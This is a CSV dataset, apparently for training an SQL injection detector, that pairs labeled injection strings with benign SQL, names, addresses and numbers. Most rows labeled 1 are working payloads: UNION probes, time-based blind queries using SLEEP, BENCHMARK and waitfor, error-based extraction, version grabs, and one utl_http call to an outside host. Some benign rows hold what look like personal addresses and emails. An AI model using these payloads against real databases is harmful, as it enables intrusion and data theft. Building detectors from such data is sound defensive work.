Query,Label
"1' wherE 2332  =  2332 oR 9643  =    (  SElecT count  (  *  )   frOM domain.domains AS t1,domain.columns AS t2,domain.tables AS t3  )  --",1
SELECT * FROM hardly WHERE    NOT itself = 'trade',0
clooney,0
SELECT * FROM evidence WHERE square  BETWEEN 10 AND 20,0
-3211   )    )    as fsej whERE 6348  =  6348 OR 9805  =  3783--,1
SELECT COUNT ( pine )  FROM cut,0
59072549q,0
7.68942E+15,0
-4961'  )   oR 3038  =  3038,1
"sELECT dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   FrOM dual And    (    (   'cgou' Like 'cgou",1
-4713'   )    )     )   Or 4567  =  1287,1
"avinguda carrilet, 21,",0
"1""   )    )     )   Or 8384  =  lIkE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    AnD    (    (     (  ""wvyb""  =  ""wvyb",1
"1' IN boolean mode  )   ANd 3707  =    (  sElect count  (  *  )   from sysibm.systables aS t1,sysibm.systables aS t2,sysibm.systables aS t3  )  #",1
"SELECT copy, continued, futureFROM apartment WHERE growth  IS NOT NULL",0
SELECT COUNT ( symbol ) FROM planned,0
SELECT curious ( s )  FROM pencil,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_number_of_preferred_partners' LIMIT 1,0
"seLEcT BenchmArk  (  5000000,md5  (  0x4c4d6142   )    )    anD   (  ""poik""  =  ""poik",1
SELECT MIN ( said )  AS deal FROM statement,0
SELECT * FROM chosen WHERE importance = 'nest' LIMIT 3,0
"1   )    )    aND 9254  =    (  SElECT count  (  *  )   fROm rdb$fields AS t1,rdb$types AS t2,rdb$collations AS t3,rdb$functions AS t4  )  --",1
"sElect count  (  *  )   frOm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""%""  =  """,1
DELETE FROM wrong,0
SELECT * FROM shout WHERE flame BETWEEN '1996-07-01' AND '1996-07-31',0
"SELECT scientist,film,experiment FROM bone LEFT JOIN Orders ON stretch.mailID =  least.brass ORDER BY shoot.hurried",0
-4557 or 6872  =  6872-- kkte,1
1 oR   (  SElECt * frOm   (  SElECt  (  SLeep  (  5   )    )     )  ydpu  )  -- paxv,1
"SELECT white,breeze,beneath,per,surface     (  (  feed JOIN experience ON facing.sign =  bend.doing )   INNER JOIN simpleON Orders.poor =  stand.forwardID )",0
almazora/almassora,0
besal,0
"1'   )    )     )   OR 8466  =  bENcHMaRK  (  5000000,md5  (  0x694a4745   )    )    aND    (    (     (  'tpeo' lIkE 'tpeo",1
SELECT AVG ( fort ) FROM interior,0
SELECT TOP 3 * FROM just WHERE doll = 'adventure' SELECT * FROM try,0
"1""   )    )     )   aND   (  seLect * From   (  seLect  (  sLEEP  (  5   )    )     )  fzno  )   aND    (    (     (  ""uncg""  =  ""uncg",1
"1'   )    )    And CHar  (  107  )  ||CHar  (  121  )  ||CHar  (  97  )  ||CHar  (  80  )    =  regexp_substring  (  repeat  (  lEFt  (  crypt_key  (  CHar  (  65  )  ||CHar  (  69  )  ||CHar  (  83  )  ,nULL  )  ,0  )  ,500000000  )  ,nULL  )  --",1
1   )    )     )   rlike   (  SElect * from   (  SElect  (  sleeP  (  5   )    )     )  sgvo  )   aNd    (    (     (  4574  =  4574,1
"SELECT arrangement,worse FROM soft WHERE wrong = 'wet' UNION SELECT rubbed, appearance FROM through",0
febrido,0
SELECT halfway ( s )  FROM correct,0
champ,0
bethania,0
SELECT * FROM ate WHERE Price NOT BETWEEN 10 AND 20,0
"1'   )    )    ANd 3202  =  lIkE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    ANd    (    (   'nbsr' lIkE 'nbsr",1
39515,0
"-7686%""  )   or 1 gRoup by concat  (  0x7171706a71,  (  seLeCT   (  Case wHeN   (  4232  =  4232  )   then 1 ELSE 0 eNd   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    HAvinG min  (  0  )  #",1
SELECT * FROM machinery,0
1'  )   AS sruz WHERE 6318  =  6318,1
"-9145%'   )    )     )   or make_set  (  9017  =  9368,9368  )   aND    (    (     (  '%'  =  '",1
"1%' anD 8514  =    (  seLeCt count  (  *  )   From domain.domains aS t1,domain.columns aS t2,domain.tables aS t3  )   anD '%'  =  '",1
"1%'   )    )     )   ANd 2388  =  bEncHMaRK  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT * FROM understanding WHERE Price NOT BETWEEN 10 AND 20,0
palera,0
"1%""  )   waitfor delay '0:0:5' AnD   (  ""%""  =  """,1
SELECT * FROM ever WHERE voyage BETWEEN 'ground' AND 'shelf',0
"1"" WHERE 7245  =  7245 and 9198  =  9198--",1
SELECT least ( s ) FROM again INNER JOIN,0
SELECT about FROM tell UNION ALL SELECT nose FROM bad ORDER BY safety,0
SELECT * FROM type  WHERE cow NOT LIKE '[rocky]%',0
"call regexp_substring  (  repeat  (  RIGhT  (  ChaR  (  3702  )  ,0  )  ,500000000  )  ,NULl  )   anD    (    (   'frpo' LIKE 'frpo",1
"1""   )    )    rlike sLeEP  (  5  )   aND    (    (   ""ahhx"" LIKE ""ahhx",1
45440,0
bohdan,0
"-8612'+  (  selecT 'iqla' wheRe 5035  =  5035 UnIOn aLL selecT 5035,5035,5035,5035,5035,5035,5035#",1
SELECT TOP 3 * FROM climate SELECT * FROM rate 3SELECT * FROM show,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367659 ),0
SELECT TOP 50 PERCENT * FROM compound,0
35210254z,0
"1   )    )    as atiy WhEre 3855  =  3855 And 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sElECt   (  CASe WhEN   (  6055  =  6055  )   theN 1 eLSE 0 ENd  )   From dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"SELECT Employees.tomorrow, COUNT ( Orders.silenceID )  AS heardFROM    ( OrdersINNER JOIN store ON Orders.islandID  =  Employees.elseID )",0
"1'   )    )     )    (  sElecT   (  caSe WhEN   (  5451  =  5451  )   tHEN regexp_substring  (  repeat  (  righT  (  CHar  (  5451  )  ,0  )  ,500000000  )  ,nULL  )   eLse CHar  (  108  )  ||CHar  (  76  )  ||CHar  (  112  )  ||CHar  (  116  )   ENd  )   fRoM information_schema.system_users  )   aND    (    (     (  'owga' LikE 'owga",1
SELECT COUNT ( thumb ) FROM elephant,0
"SELECT solid AS what, floor AS [practice]  FROM title",0
""" or """"&""",1
SELECT COUNT ( cuttingID ) FROM way,0
-6030%'  )   Or 3038  =  3038,1
"calle darsena san magin 198,",0
"-8013%"" oR 1570  =  coNverT  (  int,  (  seLect ChaR  (  113  )  +ChaR  (  113  )  +ChaR  (  112  )  +ChaR  (  106  )  +ChaR  (  113  )  +  (  seLect   (  CAse when   (  1570  =  1570  )   THEn ChaR  (  49  )   ELsE ChaR  (  48  )   EnD   )    )   +ChaR  (  113  )  +ChaR  (  122  )  +ChaR  (  118  )  +ChaR  (  122  )  +ChaR  (  113   )    )     )   anD ""%""  =  """,1
SELECT fox FROM first UNION SELECT breakfast FROM mouse ORDER BY silk,0
"1  )   ANd chAR  (  109  )  ||chAR  (  79  )  ||chAR  (  70  )  ||chAR  (  90  )    =  regexp_substring  (  repeat  (  RIGHT  (  chAR  (  5012  )  ,0  )  ,5000000000  )  ,nulL  )  --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367848 )  ORDER BY meta_id ASC",0
"enD AND    (    (   ""kvts"" lIKe ""kvts",1
llompart maydana,0
raian,0
cortegana,0
"1""   )    )    As lomw wheRE 9257  =  9257 unioN aLL sELeCT Null,Null,Null,Null,Null,Null--",1
"1%'  )   AnD 2388  =  BeNChMArk  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT AVG ( direction ) FROM television SELECT SUM ( last ),0
"1%"" aNd 2716  =    (  SelECT count  (  *  )   froM sysusers aS sys1,sysusers aS sys2,sysusers aS sys3,sysusers aS sys4,sysusers aS sys5,sysusers aS sys6,sysusers aS sys7  )  --",1
SELecT   (  CASe WhEN   (  5569  =  9390  )   Then 5569 ElSe 1/  (  SELecT 0  )   eNd  )  --,1
"-3505""  )   OR 5290  =  3436--",1
enconadura,0
"-8612'  )   aS toeu WhEre 6357  =  6357 OR 1570  =  COnverT  (  int,  (  SELECt cHaR  (  113  )  +cHaR  (  113  )  +cHaR  (  112  )  +cHaR  (  106  )  +cHaR  (  113  )  +  (  SELECt   (  cASE whEn   (  1570  =  1570  )   TheN cHaR  (  49  )   ELSe cHaR  (  48  )   eND   )    )   +cHaR  (  113  )  +cHaR  (  122  )  +cHaR  (  118  )  +cHaR  (  122  )  +cHaR  (  113   )    )     )  --",1
"-8636""   )    )     )   UNIon aLl SELEcT 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",1
"1'   )    )     )   anD 8407  =    (  sElect count  (  *  )   frOm generate_series  (  1,5000000   )    )    anD    (    (     (  'pufu' liKe 'pufu",1
"UnIOn   (  SElECT NULl, NULl, NULl, NULl,    (  SElECT @@veRSION   )    )    --",1
SELECT * FROM torn WHERE dug  BETWEEN 10 AND 20,0
"1'   )    )     )   uniOn All sElect nULL,nULL,nULL,nULL,nULL,nULL,nULL,nULL,nULL,nULL#",1
lantarn,0
SELECT * FROM industrial WHERE cross = 'bridge' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM limited,0
2.79749E+15,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9774 )  ORDER BY meta_id ASC",0
"SELECT column_name ( s )  FROM please,lucky",0
oestreic,0
8clo736,0
SELECT TOP 3 * FROM somehow,0
"SELECT LOG ( 2, 4 ) ;",0
1' Or 6793  =    (  SelEcT 6793 FrOM pg_sleep  (  5   )    )    AND 'hokd'  =  'hokd,1
"make_set  (  7729  =  7729,1  )",1
SELECT AVG ( war ) FROM layers SELECT SUM ( men ),0
"waitfor delay '0:0:5' ANd    (    (   ""zili"" like ""zili",1
"SElEct * frOm users WhERE id  =  1 oR ""  (  ;"" oR 1  =  1 -- 1",1
SELECT COUNT ( positive ) FROM nice,0
SELECT * FROM master FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM beauty,0
"1""   )    )     )   anD   (  selecT 2*  (  if   (    (   selecT * fRoM   (  selecT concat  (  0x7171706a71,  (  selecT   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   anD    (    (     (  ""jmjr"" LiKe ""jmjr",1
14399392n,0
--,1
SELECT * FROM specific WHERE various NOT LIKE 'member%',0
9423,0
-7054  )   aS gzvf wHeRe 9146  =  9146 or 3038  =  3038,1
SELECT quietly FROM where UNION ALL SELECT short FROM went ORDER BY caught,0
1875,0
SELECT industry ( s )  FROM case UNION,0
"1"" aNd 3707  =    (  sEleCt count  (  *  )   From sysibm.systables AS t1,sysibm.systables AS t2,sysibm.systables AS t3  )   aNd ""hvwv""  =  ""hvwv",1
"-9445  )   AS dmur WheRe 4371  =  4371 uNioN AlL seleCT 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",1
SELECT * FROM principle,0
abieldar,0
1 whERe 4641  =  4641,1
"1'  )   aS keom whErE 7524  =  7524 aND 2716  =    (  SELeCt count  (  *  )   fROm sysusers aS sys1,sysusers aS sys2,sysusers aS sys3,sysusers aS sys4,sysusers aS sys5,sysusers aS sys6,sysusers aS sys7  )  --",1
22496795n,0
ci2586ta,0
SELECT * FROM whenever,0
SELECT AVG ( Price ) FROM telephone,0
eXEc sp,1
"SELECT * FROM missing WHERE fairly NOT IN  ( 'father', 'industry', 'travel' )",0
SELECT * FROM volume WHERE who = 'paint'  AND  ( good = 'discover' OR bigger = 'tired' ),0
"1%""   )    )    rlike   (  SEleCt * FROm   (  SEleCt  (  SleeP  (  5   )    )     )  sgvo  )   anD    (    (   ""%""  =  """,1
"1',  (  SelECt   (  cASe WheN   (  7734  =  7734  )   TheN   (  SelECt BenchmARK  (  5000000,md5  (  0x72747341   )    )     )   eLsE 7734*  (  SelECt 7734 FrOm mysql.db  )   eND   )    )",1
dyck,0
mirabel,0
"seleCT * FrOm users WHERe id  =  1 oR $<\ uNion seleCT 1,@@vErSion -- 1",1
SELECT hurried ( s ) FROM saw INNER JOIN,0
SELECT hot ( s )  FROM division LEFT JOIN,0
robelo@moviels.me,0
"seLEct * FrOm users wHEre id  =  1 oR ""1]"" oR 1  =  1 -- 1",1
byoungin,0
kaunas,0
mediona,0
SELECT * FROM country FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM section,0
"-4972'   )    )    as kfzc wherE 8817  =  8817 uNiON aLL SELeCT 8817,8817,8817,8817,8817,8817--",1
SELECT * FROM roar,0
SELECT * FROM  ( SELECT replied FROM straight ),0
"SELECT DATE_SUB ( ""2017-06-15"", INTERVAL 10 DAY ) ;",0
"1%'   )    )    anD extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  SELeCt   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    anD    (    (   '%'  =  '",1
depredador,0
SELECT * FROM escape WHERE everybody = 'action' LIMIT 3,0
manferidor,0
blenkarn6,0
curul,0
"SELECT action, stairs, cool FROM noun WHERE arm  IS NULL",0
"-5572""  )   uNIoN aLL SeleCt 8131,8131#",1
DELETE FROM pink,0
mong-tse,0
3.65591E+15,0
5215,0
tesisteco avi,0
SELECT * FROM danger ORDER BY wealth,0
SELECT * FROM fighting WHERE worth = 'rock' LIMIT 3,0
"-7345%"" oR 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seLect   (  CasE WHEN   (  5023  =  5023  )   THEn 1 elSE 0 enD  )   froM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   AND ""%""  =  """,1
"1   )    )     )   aND 3707  =    (  sElect count  (  *  )   fRom sysibm.systables AS t1,sysibm.systables AS t2,sysibm.systables AS t3  )   aND    (    (     (  8018  =  8018",1
3.19537E+15,0
"1""   )    )    AS wwqj wheRe 3249  =  3249 aND 9254  =    (  SelEcT count  (  *  )   FROM rdb$fields AS t1,rdb$types AS t2,rdb$collations AS t3,rdb$functions AS t4  )  --",1
zahira,0
afasia,0
8.08498E+15,0
"1%""   )    )     )   UNIon alL SeleCt NUlL,NUlL,NUlL,NUlL,NUlL#",1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
SELECT AVG ( distant ) FROM area SELECT SUM ( show ),0
SELECT * FROM birthday WHERE continued = 'slowly' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM blind WHERE order NOT LIKE 'century%',0
SELECT out ( s )  FROM afternoon,0
giovannina,0
guhl.monks@goscan.za,0
1  )   WHEre 2307  =  2307,1
"1%""   )    )    OR 7417  =    (  sELect count  (  *  )   FroM sysibm.systables aS t1,sysibm.systables aS t2,sysibm.systables aS t3  )  --",1
SELECT smile FROM river,0
"SELECT Employees.asleep, COUNT ( Orders.furID )  AS gentlyFROM    ( OrdersINNER JOIN necessary ON Orders.wolfID  =  Employees.visitID )",0
95642019s,0
SELECT * FROM count WHERE right = 'tune'  AND City = 'how',0
"-9856"" union ALL SeLecT 9753--",1
"1""   )    )     )   anD SLEeP  (  5  )  #",1
"-5385"" UNIoN aLl sELEcT 4577,4577,4577,4577,4577,4577,4577#",1
"SELECT uncle, studying, jumpFROM for WHERE from  IS NOT NULL",0
SELECT * FROM yellow WHERE fill BETWEEN neighborhood09/01/1996free AND than15/31/1996they,0
UnIoN ALl sElECt,1
"1"" Or Sleep  (  5  )   And ""fbuo"" LikE ""fbuo",1
"SELECT form,last FROM break WHERE paragraph = 'summer' UNION SELECT drive, blanket FROM current",0
SELECT * FROM balance WHERE return = 'atomic'  OR neck = 'plant',0
"ENd AND   (  ""nuix"" liKe ""nuix",1
76,0
SELECT * FROM master WHERE at = 'baseball',0
"INSERT INTO with ( leaf, trip, today, life, view, afraid )  VALUES  ( 'been', 'round'. suit', 'replied', 'year', 'help', 'save' )",0
"-1791' UniOn ALl sELEct 9316,9316,9316,9316,9316,9316,9316,9316--",1
"1%'  )   aND   (  sEleCt 9067 From  (  sEleCt count  (  *  )  ,concat  (  0x7171706a71,  (  sEleCt   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x From information_schema.character_sets GROuP BY x  )  a  )   aND   (  '%'  =  '",1
SELECT * FROM plane WHERE band = 'gold' FETCH FIRST 3 ROWS ONLY,0
almoharn,0
"1%' UnION aLL SeleCt nuLL,nuLL,nuLL,nuLL,nuLL--",1
"-7482""   )    )     )   or 9077  =  2651",1
p5r0i9i5ar,0
SELECT * FROM  ( SELECT serious FROM salt ),0
"burgos, 40, 7?a",0
"sElECT * FROM users WHERE id  =  1 OR 1#""? UNIon sElECT 1,VeRSion  (    )   -- 1",1
SELECT COUNT ( whom ) FROM inside,0
"SELECT term_id, meta_key, meta_value FROM wp_termmeta WHERE term_id IN  ( 2712,3146,3152,2720,3078,2766,2679 )  ORDER BY meta_id ASC",0
"1""  )   Where 1705  =  1705",1
"1""   )    )    aS ycvh where 4523  =  4523 aNd SLeEP  (  5  )  #",1
8.32E+15,0
1'   )    )    As xkiq WHere 9008  =  9008 aNd SlEEP  (  5  )  --,1
onofre,0
neusy,0
FROM  ( SELECT DISTINCT trunk FROM courage ),0
gupton,0
"1""  )   And updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  SelEct   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   And   (  ""nkgd""  =  ""nkgd",1
"1""  )   uNiOn all selECt NuLl,NuLl,NuLl,NuLl,NuLl#",1
1 And 5934  =  7745,1
"SELECT * FROM certainly ORDER BY dozen, disease",0
"1"" AnD SLeEP  (  5  )   AnD ""masm""  =  ""masm",1
"omellons, els",0
"-4817 uniON ALL selECT 7415,7415,7415,7415,7415,7415,7415,7415,7415#",1
"-9432   )    )    as nqya WhEre 8387  =  8387 Or elt  (  9242  =  6180,6180  )  --",1
SELECT * FROM root WHERE recently = 'parts'  AND City = 'potatoes',0
colvara pulve,0
"1'  )   UniON ALL SeLeCT NuLl,NuLl,NuLl,NuLl,NuLl,NuLl#",1
"1'   )    )     )   Or 8315  =    (  SelEcT count  (  *  )   From sysibm.systables As t1,sysibm.systables As t2,sysibm.systables As t3  )   and    (    (     (  'vjhw' LIkE 'vjhw",1
SELECT * FROM sudden WHERE bill IN  ( SELECT spend FROM something ),0
tapioles,0
"SELECT plant,press,daughter,sand,connected     (  (  guard JOIN leader ON current.gradually =  better.silence )   INNER JOIN readerON Orders.young =  explain.parallelID )",0
SELECT TOP 3 * FROM frog,0
"-2549'  )   As zfnf WhERe 1993  =  1993 uNIOn AlL selEcT 1993,1993,1993,1993,1993,1993--",1
"elt  (  2427  =  2427,5518  )",1
sELECt   (  Case WheN   (  9455  =  6007  )   TheN 9455 eLse 9455*  (  sELECt 9455 FRom mysql.db  )   eNd  )  #,1
SELECT * FROM excitement 3 SELECT * FROM railroad,0
"1""   )    )    as bovm whEre 5560  =  5560 unioN All sElEcT NuLl,NuLl,NuLl,NuLl,NuLl,NuLl,NuLl#",1
SELECT plastic ( s )  FROM six,0
"SELECT opposite, situation, foot FROM soft WHERE buffalo  IS NULL",0
SELECT * FROM pan WHERE occasionally BETWEEN '1996-07-01' AND '1996-07-31',0
1'  )   wHeRe 5280  =  5280 aND 4595  =  4595#,1
SELECT belt,0
1'  )   ANd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecT   (  cAse When   (  7756  =  7756  )   tHEN 1 ELsE 0 END  )   FRoM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   ANd   (  'lnte'  =  'lnte,1
"1"" And chAr  (  111  )  ||chAr  (  77  )  ||chAr  (  121  )  ||chAr  (  88  )    =  regexp_substring  (  repeat  (  lEfT  (  crypt_key  (  chAr  (  65  )  ||chAr  (  69  )  ||chAr  (  83  )  ,nULl  )  ,0  )  ,500000000  )  ,nULl  )   And ""pmpk"" lIKe ""pmpk",1
"1'   )    )     )   or 8466  =  benCHMark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'gbhd'  =  'gbhd",1
SELECT AVG ( task ) FROM evening SELECT SUM ( heart ),0
rubi de biasi,0
SELECT * FROM Users WHERE UserId  =  105; DROP TABLE Suppliers;,0
SELECT AVG ( car ) FROM breeze,0
"-9574'  )   as rxym wHERe 4719  =  4719 UNiON AlL SELEct 4719,4719,4719,4719,4719,4719,4719--",1
"SELECT * FROM went WHERE musical NOT IN  ( 'jack', 'settle', 'eaten' )",0
"1  )   oR 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )",1
ardevol herrador,0
fortner,0
1'  )   aS mara WhERe 7164  =  7164,1
-3598  )   UNiON alL SelEcT 2264#,1
"1""   )    )     )   oR 5356  =    (  selEct count  (  *  )   FrOm sysusers aS sys1,sysusers aS sys2,sysusers aS sys3,sysusers aS sys4,sysusers aS sys5,sysusers aS sys6,sysusers aS sys7  )  --",1
Select   (  CasE whEN   (  2394  =  4530  )   THen 2394 ELSe 2394*  (  Select 2394 FrOm information_schema.character_sets  )   End  )  #,1
"SELECT speedID AS ID, win AS proper FROM add",0
63482988k,0
"1%'   )    )    UniON aLL SeLeCT nulL,nulL,nulL--",1
"passeig picasso, 23,",0
"-8791""   )    )     )   Or make_set  (  6681  =  6620,6620  )   ANd    (    (     (  ""pvdk""  =  ""pvdk",1
SELECT * FROM funny WHERE wrapped BETWEEN '1996-07-01' AND '1996-07-31',0
"1""   )    )    UnION ALl sEleCT NUll,NUll,NUll,NUll,NUll,NUll#",1
"-9577'||  (  seleCt 'vloa' frOm dual WhErE 7184  =  7184 UNIon All seleCt 7184,7184#",1
"1'  )   AS xhmm WHERe 8092  =  8092 UNIOn AlL SeLECT NulL,NulL,NulL--",1
"call regexp_substring  (  repeat  (  rIght  (  cHAr  (  2385  )  ,0  )  ,500000000  )  ,Null  )  --",1
"1 aND 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
SELECT COUNT ( exact ) FROM pound,0
calle bendicion 160,0
"SELECT ADDTIME ( ""2017-06-15 09:34:21.000001"", ""2:10:5.000003"" ) ;",0
SELECT MIN ( being )  AS pie FROM call,0
WHERE ProductID  =  ALL  ( SELECT ProductID FROM OrderDetails WHERE Quantity  =  10 ) ;,0
jiyuan,0
"-9462""  )   aS vzga WHeRE 4799  =  4799 OR 8691  =  1048",1
9.0515E+15,0
17120,0
"SELECT * FROM station ORDER BY bark, won",0
sELeCT pg_sleep  (  5  )   AnD    (    (   4382  =  4382,1
"1'  )   wHeRE 4407  =  4407 AND chAR  (  107  )  ||chAR  (  121  )  ||chAR  (  97  )  ||chAR  (  80  )    =  regexp_substring  (  repeat  (  LEFT  (  crypt_key  (  chAR  (  65  )  ||chAR  (  69  )  ||chAR  (  83  )  ,NUlL  )  ,0  )  ,500000000  )  ,NUlL  )  --",1
"1'+  (  SELEcT 'ycsv' WhERe 3628  =  3628 ANd chaR  (  107  )  ||chaR  (  121  )  ||chaR  (  97  )  ||chaR  (  80  )    =  regexp_substring  (  repeat  (  LEFt  (  crypt_key  (  chaR  (  65  )  ||chaR  (  69  )  ||chaR  (  83  )  ,Null  )  ,0  )  ,500000000  )  ,Null  )  --",1
2260,0
"sELEct * FRom users wHeRe id  =  1 OR ""%&"" OR 1  =  1 -- 1",1
SELECT AVG ( Price ) FROM silk,0
g66uin2,0
SELECT store ( s )  FROM mail,0
"1'   )    )    AnD 6414  =    (  sELECt count  (  *  )   from rdb$fields AS t1,rdb$types AS t2,rdb$collations AS t3,rdb$functions AS t4  )   AnD    (    (   'rqbf'  =  'rqbf",1
SELECT * FROM finish 3 SELECT * FROM pale,0
"SELECT CustomerName, CONCAT ( Address,', ',PostalCode,', ',City,', ',Country )  AS Address FROM Customers;",0
"""   )    )    OR sLeEP  (  __TIME__  )    =  """,1
-5547' oR 9323  =  9323#,1
santiago de la puebla,0
"1%'   )    )    AND 8514  =    (  SElecT count  (  *  )   fRom domain.domains AS t1,domain.columns AS t2,domain.tables AS t3  )   AND    (    (   '%'  =  '",1
"1'+  (  SeLect kqac wHeRe 4362  =  4362 ANd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"sElecT * froM users WHeRe id  =  1 OR 1#""? OR 1  =  1 -- 1",1
"AnD 1  =  utl_inaddr.get_host_address   (    (   seLecT DISTINCT  (  column_name  )   frOM   (  seLecT DISTINCT  (  column_name  )  , ROWNUM aS LImit frOM all_tab_columns  )   WhERE LImit  =  2   )    )    AnD 'i'  =  'i",1
"SELECT general, hay, environment FROM bicycle WHERE soon  IS NULL",0
"SELECT Employees.number, COUNT ( Orders.dailyID )  AS incomeFROM    ( OrdersINNER JOIN purple ON Orders.dependID  =  Employees.passageID )",0
SELECT * FROM turn FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM stood,0
"1'+  (  SELeCt 'wkcq' wHerE 1020  =  1020 and 2388  =  benchMaRK  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT * FROM car WHERE won IN  ( SELECT silver FROM general ),0
maeya,0
"1"" aND 8407  =    (  seleCt count  (  *  )   fRoM generate_series  (  1,5000000   )    )    aND ""zwov""  =  ""zwov",1
donhierro,0
SELECT future ( s FROM hunt RIGHT JOIN,0
"SELECT late, properly, furniture FROM travel WHERE fort  IS NULL",0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_label_2874' LIMIT 1,0
"1%'  )   ANd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   ANd   (  '%'  =  '",1
SELECT * FROM fell WHERE engineer NOT LIKE '[basket]%',0
"1'||  (  sELECt 'gikt' wherE 8447  =  8447 Or 1022  =    (  sELECt count  (  *  )   FRoM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
graupere trabucco,0
SELECT AVG ( save ) FROM require,0
"1' AnD 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )",1
villanueva gualano,0
"1  )   AS estm wHErE 4809  =  4809 UnION aLl sELECt NULL,NULL,NULL--",1
pablo,0
8.5138E+15,0
"1""  )   aS pxdq WhERe 2236  =  2236 ANd 2006  =  2006",1
"1%""  )   And updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   And   (  ""%""  =  """,1
"-6200' wherE 9150  =  9150 uNIOn aLL SelEct 9150,9150,9150,9150,9150,9150,9150#",1
"1%""   )    )    aND elt  (  3114  =  3114,sLEeP  (  5   )    )   #",1
46183,0
"1%""   )    )     )   anD 3580  =    (  sELecT count  (  *  )   fRom domain.domains aS t1,domain.columns aS t2,domain.tables aS t3  )  --",1
"SELECT EXTRACT ( WEEK FROM ""2017-06-15"" ) ;",0
